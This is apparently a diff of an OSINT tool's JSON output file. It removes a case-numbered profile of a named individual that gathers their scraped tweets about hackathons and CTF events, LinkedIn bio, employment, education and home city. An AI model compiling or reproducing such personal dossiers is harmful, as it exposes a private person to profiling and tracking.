-                    "1": "\ud835\udddb\ud835\uddee\ud835\uddf0'\ud835\uddde\ud835\udde3 \ud835\uddea\ud835\uddf2\ud835\uddef\ud835\uddf6\ud835\uddfb\ud835\uddee\ud835\uddff \ud835\udde6\ud835\uddf2\ud835\uddff\ud835\uddf6\ud835\uddf2\ud835\ude00 - \ud835\udc0c\ud835\udc2c. \ud835\udc15\ud835\udc1a\ud835\udc27\ud835\udc1d\ud835\udc1a\ud835\udc27\ud835\udc1a \ud835\udc15\ud835\udc1e\ud835\udc2b\ud835\udc26\ud835\udc1a, \ud835\udc06\ud835\udc25\ud835\udc28\ud835\udc1b\ud835\udc1a\ud835\udc25 \ud835\udc01\ud835\udc28\ud835\udc1a\ud835\udc2b\ud835\udc1d \ud835\udc28\ud835\udc1f \ud835\udc03\ud835\udc22\ud835\udc2b\ud835\udc1e\ud835\udc1c\ud835\udc2d\ud835\udc28\ud835\udc2b\ud835\udc2c, \ud835\udc0e\ud835\udc16\ud835\udc00\ud835\udc12\ud835\udc0f \ud835\udc05\ud835\udc28\ud835\udc2e\ud835\udc27\ud835\udc1d\ud835\udc1a\ud835\udc2d\ud835\udc22\ud835\udc28\ud835\udc27\n@CyberdomeKerala @TheKeralaPolice @InfosecVandana @owasppic.twitter.com/n7lZ5hNGhM",
-                    "2": "Catch me tomorrow on HacKP @DomeHacKP for Techtalk on topic : Bypassing scrape detection with Pythonpic.twitter.com/6lc1GCsoOK",
-                    "3": "\ud835\udddb\ud835\uddee\ud835\uddf0\ud835\uddde\ud835\udde3 - \ud835\udde2\ud835\uddfb\ud835\uddf9\ud835\uddf6\ud835\uddfb\ud835\uddf2 \ud835\udddb\ud835\uddee\ud835\uddf0\ud835\uddf8\ud835\uddee\ud835\ude01\ud835\uddf5\ud835\uddfc\ud835\uddfb \ud835\udfee\ud835\udfec\ud835\udfee\ud835\udfec\nBuckle up! The battle is about to start. Sharpen your skills for only the bests will remain for the final war.\nIntroducing our 10th troop.. \"\ud835\ude4a\ud835\ude4e\ud835\ude44\ud835\ude49\ud835\ude4f\ud835\ude4e\ud835\ude4b\ud835\ude47\ud835\ude4a\ud835\ude44\ud835\ude4f\"\n#HacKP #VirtualHackathonpic.twitter.com/QNNiPCY0lG",
-                    "4": "There you go the team #OSINTSPLOIT from tamilnadu for #hackp @DomeHacKP\n@adithyan_akpic.twitter.com/MXUtuP6hjp",
-                    "5": "Bro @adithyan_ak did we spam it and we are on top of leader board ??? #hackp @DomeHacKPpic.twitter.com/2a70dDROuZ",
-                    "6": "Team #OSINTsploit, presenting you a preview of our solution to the Problem -\nTracking and Tracing Cyber criminals by Cops (RK310)\nDomain: Security and Surveillance\n@PMOIndia\n@abhayjere\n@DrRPNishank\n@BPRDIndia\n@mhrd_innovation\n#SmartIndiaHackathon2020 pic.twitter.com/jD32AHRotzpic.twitter.com/AYr90rJgbX",
-                    "7": "We are happy to announce the Team A and Team B which will compete against each other in the SECARMY KoTH July Finals at the weekend. It has been a great journey so far and we wish luck to these 2 teams.\nWe would like to thank our sponsor @RealTryHackMe.pic.twitter.com/kAUM3GyvF9",
-                    "8": "Can you hack your way onto the  finals of the SECARMY KoTH July ? Just 7 hours to go !! Make sure to participate and win awesome prizes like: \n1. Subscriptions ( by @RealTryHackMe with ) \n2. Certificate/s made with \n3. Discord Nitro Classic \nJoin: https://discord.gg/pPsZJGf\u00a0https://twitter.com/secarmyofficial/status/1281867287192989699\u00a0\u2026",
-                    "9": "Check out my interaction with @PatrickCMiller -  founder of EnergySec also Infrastructure and Industrial sector advisor enriched the listeners with his deep knowledge on Threat Intelligence, Information sharing and other myths on @secarmyofficial Podcasts.https://bit.ly/secarmypodcast\u00a0pic.twitter.com/agzpMSjF66"
-                }
-            },
-            "linkedin": {
-                "Profileimg": "https://media-exp1.licdn.com/dms/image/C5103AQFRkw8I0WGm4A/profile-displayphoto-shrink_200_200/0?e=1602115200&v=beta&t=I5iHu82CUiCAxWiNFNHnLlHJ5NXSpfFnT89PT6hIm8w",
-                "Name": "Aravindha Hariharan M",
-                "Bio": "Secarmy Developer | CNSS | NSE2 | Cybersecurity Enthusiastic | CTF Player | InfoSec | Red-Hat Academy Student Ambassador",
-                "Location": "Coimbatore, Tamil Nadu, India",
-                "About": "I'm an Cyber Security enthusiast who love to research on the topics related to Capture The Flag, 0 days exploits, \nInformation Security, Ways to create and deploy python tools.\n\n\n...\n            see more\n\n... see more",
-                "Experience": [
-                    {
-                        "Position": "Secarmy Developer",
-                        "Company": "Security and Research Community (SECARMY) Part-time"
-                    },
-                    {
-                        "Position": "CTF Player (Hacker)",
-                        "Company": "Hack The Box"
-                    },
-                    {
-                        "Position": "Level 0x06",
-                        "Company": "TryHackMe"
-                    },
-                    {
-                        "Position": "Student Ambassador - Redhat Academy",
-                        "Company": "Red Hat"
-                    },
-                    {
-                        "Position": "Aravindha vfx",
-                        "Company": "Self employed"
-                    }
-                ],
-                "Education": [
-                    {
-                        "University": "SRI KRISHNA COLLEGE OF ENGINEERING AND TECHNOLOGY",
-                        "Degree": "Bachelor of Technology - BTech"
-                    },
-                    {
-                        "University": "Kikani Vidhya Mandir",
-                        "Degree": "12th"
-                    },
-                    {
-                        "University": "Kikani Vidhya Mandir",
-                        "Degree": "10th"
-                    }
-                ]
-            },
-            "location": [
-                "Coimbatore, Tamil Nadu",
-                "Coimbatore, Tamil Nadu",
-                "Coimbatore"
-            ],
-            "case": "001"
+            "case": "101"
         }
     }
 }
